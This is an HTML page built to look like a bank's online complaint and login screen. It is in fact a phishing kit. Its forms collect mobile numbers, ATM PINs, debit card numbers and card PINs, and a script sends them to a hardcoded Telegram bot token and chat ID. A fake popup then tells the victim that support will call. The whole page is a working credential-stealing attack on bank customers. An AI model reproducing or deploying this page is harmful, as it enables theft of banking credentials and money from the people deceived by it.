<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>complain online</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      margin: 0;
      background: #f8fafa;
    }
    .header-img {
      width: 100%;
      height: auto;
      display: block;
    }
    .container {
      max-width: 400px;
      margin: 0 auto;
      background: white;
      border-radius: 15px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      overflow: hidden;
      position: relative;
      z-index: 1;
    }
    .tabs {
      display: flex;
      justify-content: space-around;
      border-bottom: 2px solid #ddd;
      font-weight: bold;
    }
    .tab {
      padding: 12px;
      flex: 1;
      text-align: center;
    }
    .tab.active {
      border-bottom: 3px solid #007b9f;
      color: #007b9f;
    }
    .form-switch {
      display: flex;
      justify-content: space-around;
      margin: 15px 10px;
    }
    .form-switch button {
      flex: 1;
      margin: 0 3px;
      padding: 8px;
      border: none;
      border-radius: 20px;
      background: #e8f4f7;
      cursor: pointer;
      font-weight: bold;
    }
    .form-switch button.active {
      background: #52c1dd;
      color: white;
    }
    .form-section {
      display: none;
      padding: 15px;
    }
    .form-section.active {
      display: block;
    }
    input, select {
      width: 100%;
      margin: 8px 0;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 10px;
      box-sizing: border-box;
    }
    .btn {
      background: linear-gradient(to right, #7ed6df, #55efc4);
      color: #fff;
      border: none;
      width: 100%;
      padding: 12px;
      border-radius: 25px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }
    .footer-icons {
      display: flex;
      justify-content: space-around;
      padding: 15px 0;
      border-top: 1px solid #eee;
    }
    .footer-icons div {
      text-align: center;
      font-size: 12px;
      color: #007b9f;
    }
    .footer-message {
      text-align: center;
      font-size: 14px;
      padding: 10px;
      color: #666;
    }
    .footer-message span {
      color: #f57c7c;
    }

    /* ‚úÖ Popup style */
    .popup-bg {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(5px);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
    }

    .popup {
      background: white;
      padding: 20px 25px;
      border-radius: 10px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
      text-align: center;
      max-width: 300px;
      animation: fadeIn 0.3s ease-in-out;
    }

    .popup h3 {
      margin: 0 0 10px;
      color: #2e86de;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

<img class="header-img" src="https://i.ibb.co/YBNXmkPg/images-7.png" alt="Header Image">

<div class="container">

  <div class="tabs">
    <div class="tab active">LOGIN</div>
  </div>

  <div class="form-switch">
    <button class="active" onclick="showForm('user')">Mobile Number</button>
    <button onclick="showForm('debit')">Debit Card</button>
  </div>

  <!-- Mobile Number Form -->
  <div class="form-section active" id="form-user">
    <input type="text" id="mobile" placeholder="Mobile Number" maxlength="10" pattern="\d*">
    <input type="password" id="atm" placeholder="ATM PIN" minlength="4">
    <label>Directly go to screen</label>
    <select id="screen1">
      <option>Dashboard</option>
      <option>complain</option>
    </select>
    <button class="btn" onclick="sendToTelegram('user')">üîí Secure Login</button>
  </div>

  <!-- Debit Card Form -->
  <div class="form-section" id="form-debit">
    <input type="text" id="card" placeholder="Debit Card No." maxlength="19" oninput="formatCard(this)">
    <input type="password" id="pin" placeholder="Card Pin">
    <label>Directly go to screen</label>
    <select id="screen2">
      <option>Dashboard</option>
    </select>
    <button class="btn" onclick="sendToTelegram('debit')">üîí Secure Login</button>
  </div>

  <div class="footer-icons">
    <div>üìπ<br>Demo Videos</div>
    <div>üßÆ<br>Smart Calculator</div>
    <div>üìç<br>Locate Us</div>
  </div>
</div>

<div class="footer-message">
  Pay, Save, Borrow & Invest money <br>with a <span>single bank</span>
</div>

<!-- ‚úÖ Popup Success Message -->
<div class="popup-bg" id="popup">
  <div class="popup">
    <h3>‚úÖ Please wait 30 minutes.</h3>
    <p>Our customer support team will contact you soon.</p>
  </div>
</div>

<script>
  function showForm(id) {
    document.querySelectorAll('.form-switch button').forEach(btn => btn.classList.remove('active'));
    document.querySelectorAll('.form-section').forEach(f => f.classList.remove('active'));
    document.querySelector(`#form-${id}`).classList.add('active');
    event.target.classList.add('active');
  }

  function sendToTelegram(type) {
    let message = '';
    if (type === 'user') {
      const mobile = document.getElementById('mobile').value.trim();
      const atm = document.getElementById('atm').value.trim();
      const screen = document.getElementById('screen1').value;

      if (mobile.length !== 10 || isNaN(mobile)) {
        alert("Enter valid 10-digit mobile number.");
        return;
      }
      if (atm.length < 4) {
        alert("ATM PIN must be at least 6 digits.");
        return;
      }

      message = `üì≤ Mobile Login\nMobile: ${mobile}\nATM PIN: ${atm}\nScreen: ${screen}`;
    } else {
      const card = document.getElementById('card').value.trim();
      const pin = document.getElementById('pin').value.trim();
      const screen = document.getElementById('screen2').value;

      if (card.replace(/\s/g, '').length !== 16) {
        alert("Enter valid 16-digit card number.");
        return;
      }

      message = `üí≥ Debit Login\nCard: ${card}\nPIN: ${pin}\nScreen: ${screen}`;
    }

    const token = "7882249824:AAH_uilWT-fudDHjgyav97CGNR9XZHwh_5A";
    const chatId = "6677946042";
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    fetch(url)
      .then(() => {
        document.getElementById("popup").style.display = "flex";
      })
      .catch(() => {
        alert("‚ùå Failed to send. Please try again.");
      });
  }

  // ‚úÖ Format card number as 4x4 with spaces
  function formatCard(input) {
    let value = input.value.replace(/\D/g, "").slice(0, 16);
    let formatted = value.replace(/(.{4})/g, "$1 ").trim();
    input.value = formatted;
  }
</script>

</body>
</html>
